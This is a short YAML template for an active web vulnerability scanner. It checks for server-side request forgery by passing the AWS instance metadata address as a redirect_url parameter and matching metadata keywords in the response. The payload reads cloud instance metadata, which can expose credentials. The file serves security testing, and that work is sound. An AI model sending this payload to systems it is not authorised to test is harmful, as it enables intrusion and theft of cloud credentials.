id: patt-ssrf-local-01-redirect_url
name: 'PATT ssrf patt-ssrf-local-01 via redirect_url'
severity: high
type: active
tags:
  - ssrf
  - patt
description: 'PATT AWS metadata baseline. [patt:patt-ssrf-local-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      redirect_url:
        - 'http://169.254.169.254/latest/meta-data/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
